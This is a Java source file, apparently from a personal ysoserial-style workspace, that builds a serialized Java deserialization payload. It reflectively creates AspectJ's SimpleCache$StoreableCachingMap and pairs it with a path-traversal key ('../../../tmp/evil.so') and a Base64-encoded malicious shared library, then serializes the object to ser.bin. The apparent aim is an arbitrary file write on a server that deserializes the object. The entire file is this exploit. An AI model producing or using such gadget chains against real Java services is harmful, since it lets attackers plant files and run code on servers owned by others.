package com.example.jdbctest.bean;

import com.example.jdbctest.bean.UserBean;

import java.lang.reflect.Constructor;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;

public class AJ_writeso {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\src\\main\\java\\com\\example\\jdbctest\\bean\\evil.so"));
        Class clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor constructor = clazz.getDeclaredConstructor(String.class,int.class);
        constructor.setAccessible(true);
        HashMap storeableCachingMap = (HashMap) constructor.newInstance("./",1);
//        storeableCachingMap.put("writeToPathFILE",code);
        String age = Base64.getEncoder().encodeToString(code);
        UserBean userBean = new UserBean("../../../../../../../../../../../../tmp/evil.so",age);
        userBean.setObj(storeableCachingMap);
        serialize(userBean);
//        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws Exception, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
